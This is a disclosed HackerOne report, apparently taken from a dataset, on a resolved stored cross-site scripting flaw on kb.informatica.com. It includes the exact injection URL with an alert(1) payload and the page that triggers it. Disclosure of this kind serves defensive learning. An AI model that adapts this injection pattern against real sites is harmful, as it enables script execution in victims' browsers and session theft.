---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '170369'
original_report_id: '170369'
title: '[kb.informatica.com] Stored XSS'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: informatica
created_at: '2016-09-19T09:07:25.925Z'
disclosed_at: '2017-04-09T12:22:44.923Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 7
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [kb.informatica.com] Stored XSS

## Metadata

- HackerOne Report ID: 170369
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: informatica
- Disclosed At: 2017-04-09T12:22:44.923Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

kb.informatica.org is vulnerable to stored XSS as it stores user input in users' sessions, then reflects this input back inside a JavaScript block without adequate escaping.

To replicate this issue, first store the payload in your session by visiting: https://kb.informatica.com/kbexternal/Pages/KBSearchResults.aspx?k=Support%20Console&fromsource=11171"%3balert(1)%2f%2f535

Then visit https://kb.informatica.com/faq/1/Pages/17033.aspx?docid=17033&type=external&isSearch=external

This should trigger an alert, due to the following HTML in the second response: 
<script type="text/javascript">
//<![CDATA[
var isExternal = true; var varSearchResultURL = "http://kb.informatica.com:7001/kbexternal/Pages/KBSearchResults.aspx?k=Support Console&fromsource=11171";alert(1)//535";

Replicating this may take a few attempts - it's a bit flaky. I used Firefox but it ought to work in any browser. Let me know if you have trouble.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
